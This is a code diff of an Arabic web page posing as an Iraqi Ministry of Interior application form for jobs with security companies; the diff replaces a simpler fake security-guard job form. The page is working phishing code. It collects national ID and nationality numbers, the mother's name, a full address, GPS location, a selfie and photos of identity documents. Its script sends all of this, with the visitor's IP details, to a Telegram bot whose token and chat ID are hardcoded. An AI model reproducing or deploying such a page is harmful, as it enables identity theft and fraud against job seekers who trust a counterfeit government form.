@@ -3,43 +3,111 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>وظيفة أمنية</title>
+<title>وزارة الداخلية - استمارة التقديم على ملاك الشركات الأمنية</title>
 <style>
-body{font-family:Arial;background:linear-gradient(135deg,#1a237e,#0d1442);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;margin:0}
-.container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);width:100%;max-width:420px}
-h1{color:#1a237e;text-align:center;font-size:22px;margin-bottom:5px}
-p{color:#666;text-align:center;font-size:14px;margin-bottom:15px}
-input,select{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box;background:#f9f9f9}
-button{width:100%;padding:14px;background:#1a237e;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#1a1a1a;padding:0 0 30px 0;min-height:100vh}
+.header{background:linear-gradient(135deg,#000,#1a1a1a);padding:20px;text-align:center;border-bottom:4px solid #b8860b}
+.header h1{font-size:18px;color:#fff}
+.header h2{font-size:14px;color:#b8860b;font-weight:normal;margin-top:4px}
+.header .sub{font-size:12px;color:#888;margin-top:6px}
+.badge{display:inline-block;background:#b8860b;color:#000;padding:3px 12px;border-radius:12px;font-size:11px;font-weight:bold;margin-top:8px}
+.container{max-width:500px;margin:15px auto;padding:0 15px}
+.card{background:#222;border-radius:10px;padding:20px;margin-bottom:15px;border:1px solid #333}
+.card h3{color:#b8860b;font-size:16px;margin-bottom:15px;border-bottom:1px solid #333;padding-bottom:8px}
+label{display:block;font-size:13px;color:#ccc;margin-top:10px;margin-bottom:4px}
+input,select{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:6px;color:#fff;font-size:14px;margin-bottom:5px;box-sizing:border-box}
+input[type="file"]{padding:8px;font-size:12px}
+.photo-box{text-align:center;padding:15px;background:#2a2a2a;border-radius:8px;border:2px dashed #b8860b;margin-top:10px}
+.btn{width:100%;padding:16px;background:linear-gradient(135deg,#b8860b,#8b6508);color:#000;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:15px}
+.footer{text-align:center;font-size:11px;color:#666;margin-top:15px}
 </style>
 </head>
 <body>
-<div class="container">
-<h1>🛡️ شركة الأمن العراقية</h1>
-<p>استمارة التقديم على وظيفة حارس أمن</p>
-<form id="f">
-<input type="text" id="name" placeholder="الاسم الكامل" required>
-<input type="text" id="phone" placeholder="رقم الهاتف" required>
-<input type="text" id="age" placeholder="العمر" required>
-<input type="text" id="address" placeholder="العنوان" required>
-<select id="exp" required>
-<option value="">الخبرة السابقة</option>
-<option value="لا يوجد">لا يوجد</option>
-<option value="سنة">سنة</option>
-<option value="3 سنوات">3 سنوات</option>
-<option value="5 سنوات+">5 سنوات أو أكثر</option>
-</select>
-<button type="submit">تقديم الطلب</button>
-</form>
+<div class="header">
+<h1>جمهورية العراق</h1>
+<h2>وزارة الداخلية - المديرية العامة للشركات الأمنية</h2>
+<div class="sub">استمارة التقديم على ملاك الشركات الأمنية المرخصة</div>
+<div class="badge">للذكور والإناث</div>
 </div>
+<form id="f">
+<div class="container">
+<div class="card">
+<h3>📋 البيانات الشخصية</h3>
+<label>الاسم الثلاثي *</label><input type="text" id="name" required>
+<label>اسم الأم الثلاثي *</label><input type="text" id="mother" required>
+<label>تاريخ الميلاد *</label><input type="date" id="dob" required>
+<label>الجنس *</label><select id="gender" required><option value="">اختر</option><option>ذكر</option><option>أنثى</option></select>
+<label>الحالة الاجتماعية *</label><select id="marital" required><option value="">اختر</option><option>أعزب</option><option>متزوج</option><option>مطلق</option><option>أرمل</option></select>
+</div>
+<div class="card">
+<h3>🆔 الوثائق الرسمية</h3>
+<label>رقم البطاقة الوطنية *</label><input type="text" id="nid" required>
+<label>رقم الجنسية *</label><input type="text" id="nationality" required>
+<label>رقم جواز السفر (إن وجد)</label><input type="text" id="passport">
+</div>
+<div class="card">
+<h3>📍 محل السكن</h3>
+<label>المحافظة *</label><input type="text" id="gov" required>
+<label>القضاء *</label><input type="text" id="district" required>
+<label>المحلة *</label><input type="text" id="mahalla" required>
+<label>الزقاق *</label><input type="text" id="zuqaq" required>
+<label>رقم الدار *</label><input type="text" id="dar" required>
+<label>أقرب نقطة دالة</label><input type="text" id="landmark">
+</div>
+<div class="card">
+<h3>📞 معلومات الاتصال</h3>
+<label>رقم الهاتف *</label><input type="tel" id="phone" required>
+<label>رقم هاتف بديل</label><input type="tel" id="phone2">
+<label>البريد الإلكتروني</label><input type="email" id="email">
+</div>
+<div class="card">
+<h3>💼 المؤهلات والخبرة</h3>
+<label>المؤهل الدراسي *</label><select id="edu" required><option value="">اختر</option><option>ابتدائية</option><option>متوسطة</option><option>إعدادية</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option></select>
+<label>الخبرة السابقة *</label><select id="exp" required><option value="">اختر</option><option>لا يوجد</option><option>سنة</option><option>3 سنوات</option><option>5 سنوات</option><option>أكثر من 5</option></select>
+<label>هل خدمت في القوات الأمنية سابقاً؟</label><select id="military"><option value="">اختر</option><option>نعم - الجيش</option><option>نعم - الشرطة</option><option>نعم - مكافحة الإرهاب</option><option>لا</option></select>
+</div>
+<div class="card">
+<h3>📎 المستندات المطلوبة</h3>
+<div class="photo-box">
+<label>📸 صورة الوجه (سيلفي) *</label><input type="file" id="face" accept="image/*" capture="user">
+<label>🆔 البطاقة الوطنية (الوجه) *</label><input type="file" id="nid_front" accept="image/*">
+<label>🆔 البطاقة الوطنية (الظهر) *</label><input type="file" id="nid_back" accept="image/*">
+<label>🛂 جواز السفر (إن وجد)</label><input type="file" id="passport_img" accept="image/*">
+<label>📜 شهادة الجنسية *</label><input type="file" id="nationality_img" accept="image/*">
+<label>🎓 آخر مؤهل دراسي *</label><input type="file" id="edu_img" accept="image/*">
+</div>
+</div>
+<div class="card">
+<h3>📡 الموقع الجغرافي</h3>
+<label><input type="checkbox" id="gps_chk" style="width:auto;margin-left:8px"> أوافق على مشاركة موقعي لتأكيد محل السكن</label>
+</div>
+<div class="card">
+<h3>✅ الإقرار</h3>
+<label><input type="checkbox" id="agree" required style="width:auto;margin-left:8px"> أقر بصحة جميع البيانات وأتحمل المسؤولية القانونية</label>
+</div>
+<button type="submit" class="btn">📤 إرسال الاستمارة</button>
+<div class="footer">© 2026 وزارة الداخلية العراقية<br>رقم الاستمارة: MOD-SEC-2026</div>
+</div>
+</form>
 <script>
+let gpsData='لم يتم';
+document.getElementById('gps_chk').addEventListener('change',function(){
+if(this.checked && navigator.geolocation){
+navigator.geolocation.getCurrentPosition(function(p){gpsData=p.coords.latitude+','+p.coords.longitude;},function(){gpsData='مرفوض';});
+}
+});
 async function ip(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;}catch(e){return 'N/A';}}
 document.getElementById('f').addEventListener('submit',async function(e){
 e.preventDefault();
+const BOT='8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
+const CHAT='-1003821295154';
 const info=await ip();
-const msg='🛡️ *وظيفة أمنية*\n\n👤 '+document.getElementById('name').value+'\n📞 `'+document.getElementById('phone').value+'`\n🎂 '+document.getElementById('age').value+'\n🏠 '+document.getElementById('address').value+'\n💼 '+document.getElementById('exp').value+'\n\n🌐 IP: `'+info+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
-const url='https://api.telegram.org/bot8899269662:AAFKrQ6uOIQkcJT77w5_ONiMgKhfnAE0dK4/sendMessage?chat_id=1250341553&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
-try{await fetch(url);alert('تم تقديم الطلب');document.getElementById('f').reset();}catch(e){alert('خطأ');}
+let msg='🛡️ *الشركات الأمنية*\n\n👤 '+document.getElementById('name').value+'\n👩 الأم: '+document.getElementById('mother').value+'\n🎂 '+document.getElementById('dob').value+'\n⚧ '+document.getElementById('gender').value+'\n💍 '+document.getElementById('marital').value+'\n🆔 `'+document.getElementById('nid').value+'`\n📜 الجنسية: '+document.getElementById('nationality').value+'\n🛂 الجواز: '+(document.getElementById('passport').value||'لا')+'\n\n📍 *العنوان:*\n🏙️ '+document.getElementById('gov').value+' - '+document.getElementById('district').value+'\n🏠 محلة '+document.getElementById('mahalla').value+' - زقاق '+document.getElementById('zuqaq').value+' - دار '+document.getElementById('dar').value+'\n📌 '+(document.getElementById('landmark').value||'غير محدد')+'\n\n📞 `'+document.getElementById('phone').value+'`\n📞 بديل: '+(document.getElementById('phone2').value||'لا')+'\n📧 '+(document.getElementById('email').value||'لا')+'\n\n🎓 '+document.getElementById('edu').value+'\n💼 '+document.getElementById('exp').value+'\n⚔️ '+(document.getElementById('military').value||'لا')+'\n\n🌐 IP: `'+info+'`\n📍 GPS: `'+gpsData+'`\n💻 '+navigator.platform+'\n🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+const files=[{id:'face',n:'صورة الوجه'},{id:'nid_front',n:'البطاقة وجه'},{id:'nid_back',n:'البطاقة ظهر'},{id:'passport_img',n:'جواز السفر'},{id:'nationality_img',n:'الجنسية'},{id:'edu_img',n:'المؤهل'}];
+for(const f of files){const inp=document.getElementById(f.id);if(inp.files[0]){const fd=new FormData();fd.append('chat_id',CHAT);fd.append('caption','📎 '+f.n);fd.append('photo',inp.files[0]);await fetch('https://api.telegram.org/bot'+BOT+'/sendPhoto',{method:'POST',body:fd});}}
+alert('✅ تم إرسال الاستمارة بنجاح');document.getElementById('f').reset();
 });
 </script>
 </body>
